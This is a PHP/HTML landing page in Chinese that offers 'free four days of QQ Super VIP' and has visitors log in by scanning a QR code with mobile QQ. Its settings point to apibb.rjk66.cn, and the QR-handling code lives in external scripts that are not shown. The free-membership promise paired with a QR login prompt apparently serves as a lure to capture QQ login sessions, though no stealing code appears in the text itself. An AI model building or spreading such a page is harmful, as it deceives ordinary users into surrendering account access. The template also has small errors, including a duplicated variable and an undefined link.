<?
//网站名称
$title="免费领取超会四天";
//=========================//
//网站说明
$description="免费领取超会四天，免费领取超会四天";
//=========================//
//网站关键词
$keywords="超会三天，免费领取超会四天";
//=========================//
//跳转后的页面宽度 一般为100% 可以自定义缩小比例
$ymkd="100%";
//=========================//
//跳转后的页面高度 一般为800px 可以自定义缩小放大比例 不建议用百分比
$ymgd="600px";
//=========================//
//源码下载链接
$ymurl="https://apibb.rjk66.cn";
//=========================//
//Q群跳转链接
$ymurl="https://apibb.rjk66.cn";
//=========================//
//底部版权链接
$bqurl="https://apibb.rjk66.cn";
//=========================//
//底部版权名称
$bqname="免费领取超会四天";
//=========================//
?>
<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?=$title?></title>
    <link rel="shortcut icon" href="/logo.ico" type="image/x-icon">
    <meta name="keywords" content="<?=$keywords?>">
    <meta name="description" content="<?=$description?>">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>

  </head>
  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
	<script type="text/javascript">
    $(function () {
      function getNowFormatDate() {
        var date = new Date();
        var month = date.getMonth() + 1;
        var strDate = date.getDate();
        var currentdate = month + "月" + strDate + "日";
        return currentdate;
      }
      var text = [
        "免费领取超会四天",
        "免费领取超会四天",
        "请收藏好本站",
      ], content = "";
      for (var i = 0; i < text.length; i++) {
        content += (i + 1) + ". " + text[i] + "\n";
      }
      setTimeout(function () {
        swal(getNowFormatDate() + "通知", content, "success");
      }, 100)
    })
  </script>
  <style>
	body{
		margin: 0 auto;
		text-align: center;
	}
	.container {
	  max-width: 580px;
	  padding: 15px;
	  margin: 0 auto;
	}
</style>
 <script>
  function  create() {
      var input = document.getElementById('content');
      var kd = document.getElementById('kd');
      var myid = document.getElementById('myid');
      if (myid.value==""){
          alert("ID或跳转地址不能为空！");
          return false;
      }
      var url = document.URL;
      var arrUrl = url.split("//");
      var start = arrUrl[1].indexOf("/");
      var relUrl = arrUrl[1].substring(start);
      var surl = url.replace(relUrl,"/");
      kd.href = surl + 'live/?from=&id='+myid.value+''; 
      kd.style = ''; 
      //kd.innerText = surl + '?id='+myid.value; 
	  kd.innerText = surl + 'live/?from=&id='+myid.value+'';
  }
     </script>
 <body background="https://api.ixiaowai.cn/api/api.php">
    <div class="container">
      <div class="header">
        <ul class="nav nav-pills pull-right" role="tablist">
          <li role="presentation" class="active">
            <a href="<?=$ymurl?>">源码下载</a></li>
          <li role="presentation" class="active">
            <a href="<?=$quurl?>" >加入Q群</a></li>
        </ul>
        <img src="https://q4.qlogo.cn/headimg_dl?spec=100&dst_uin=1989313426" height="40px" align="left">
        </div>
<br>
<br>
<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
        <div class="panel-heading bk-bg-primary">
          <h6>
            <span class="panel-title">免费领取超会</span>
            </h6>
        </div>
        <div class="layui-tab-content" id="smdiv">
            <div class="layui-tab-item layui-show">
                <fieldset class="layui-elem-field site-demo-button">
                    <legend style="text-align: center">扫码免费领取超会四天(QQTIM扫码)</legend>
                                <blockquote class="layui-elem-quote layui-quote-nm" id="msg">
                                    请使用手机QQ扫码登录
                                </blockquote>
                    <div id="qrimg" onclick="getqrocde()" style="text-align: center;padding: 10px">
                    </div>
                </fieldset>
            </div>
        </div>                    
        <div class="panel-body" style="display:none;" id="scdiv">
            <div class="list-group-item">
                <a href="https://apibb.rjk66.cn" target="_blank">
                    <img src="https://q4.qlogo.cn/headimg_dl?spec=100&dst_uin=1989313426" id='tximg' width="80px" style="border-radius: 50%;">
                </a>
                <blockquote class="layui-elem-quote layui-quote-nm" id="lqqq">
                </blockquote>
                <blockquote class="layui-elem-quote layui-quote-nm" id="lqmsg">
                </blockquote>
            </div>
          <div class="tip"></div>
        </div>
        <div class="panel-body" style="display:none;" id="scdiv2">
            <div class="list-group-item">
                <blockquote class="layui-elem-quote layui-quote-nm" id="hqqx">
                    请先扫码获取权限
                </blockquote>
                <div id="hqqximg"  style="text-align: center;padding: 10px">
            </div>
          <div class="tip"></div>
        </div>
      </div>
      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
        <div class="panel-body">
          <div class="alert alert-info" role="alert">
          <script src="/assets/js/msg.js?=v4" type="text/javascript"></script>
            使用说明
            <br>提示无法识别二维码：<a href="javascript:;" onclick="Solution(1)"><span style="color: #ff0000;">点击查看解决方案</a>
            <br>请先扫码登录页面
            <br>然后按页面步骤完成即可
            <br>请收藏本站,以防丢失，一号一次
            <hr class="top_hr_style02">
			<body><span id="localtime"></span>
	</nav></header>
                <script type="text/javascript">
                    function showLocale(objD) {
                        var str, colorhead, colorfoot;
                        var yy = objD.getYear();
                        if (yy < 1900) yy = yy + 1900;
                        var MM = objD.getMonth() + 1;
                        if (MM < 10) MM = '0' + MM;
                        var dd = objD.getDate();
                        if (dd < 10) dd = '0' + dd;
                        var hh = objD.getHours();
                        if (hh < 10) hh = '0' + hh;
                        var mm = objD.getMinutes();
                        if (mm < 10) mm = '0' + mm;
                        var ss = objD.getSeconds();
                        if (ss < 10) ss = '0' + ss;
                        var ww = objD.getDay();
                        if (ww == 0) colorhead = "<font color=\"#FF3030\">";
                        if (ww > 0 && ww < 6) colorhead = "<font color=\"#FF3030\">";
                        if (ww == 6) colorhead = "<font color=\"#FF3030\">";
                        if (ww == 0) ww = "星期日";
                        if (ww == 1) ww = "星期一";
                        if (ww == 2) ww = "星期二";
                        if (ww == 3) ww = "星期三";
                        if (ww == 4) ww = "星期四";
                        if (ww == 5) ww = "星期五";
                        if (ww == 6) ww = "星期六";
                        colorfoot = "</font>"
                        str = colorhead + yy + "-" + MM + "-" + dd + "丨" + hh + ":" + mm + ":" + ss + "丨" + ww + colorfoot;
                        return (str);
                    }
                    function tick() {
                        var today;
                        today = new Date();
                        document.getElementById("localtime").innerHTML = showLocale(today);
                        window.setTimeout("tick()", 1000);
                    }
                    tick();
                </script>
            <br>
        <p style="text-align:center">
          <br>&copy; Designed by
          <a href="<?=$bqurl?>"><?=$bqname?></a></p>
</div>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?cb7a49e4f6a740b15e6fd25de2803712";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<script src="assets/layui.js"></script>
<script src="assets/js/index.js"></script>
</body>
</html>